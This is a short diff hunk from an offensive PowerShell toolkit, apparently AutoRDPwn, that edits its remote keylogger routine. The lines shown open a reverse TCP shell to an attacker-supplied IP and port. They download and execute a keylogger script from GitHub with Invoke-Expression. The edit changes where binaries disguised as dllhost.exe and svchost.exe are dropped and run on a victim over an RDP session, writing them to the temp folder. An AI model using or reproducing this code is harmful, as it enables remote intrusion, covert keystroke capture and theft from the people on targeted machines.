@@ -581,8 +581,8 @@ Write-Host "--------------------------------------------------------------------
 Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
 
 if ($getkeys){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Keylogger.ps1')
-invoke-command -session $RDP[0] -scriptblock { Set-Content -Path dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path svchost.exe -Value $using:Content2 -Encoding Byte
-.\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
+invoke-command -session $RDP[0] -scriptblock { Set-Content -Path $env:temp\dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path $env:temp\svchost.exe -Value $using:Content2 -Encoding Byte
+cd $env:temp ; .\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe" ; Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "                 Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'x' to stop                 " -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
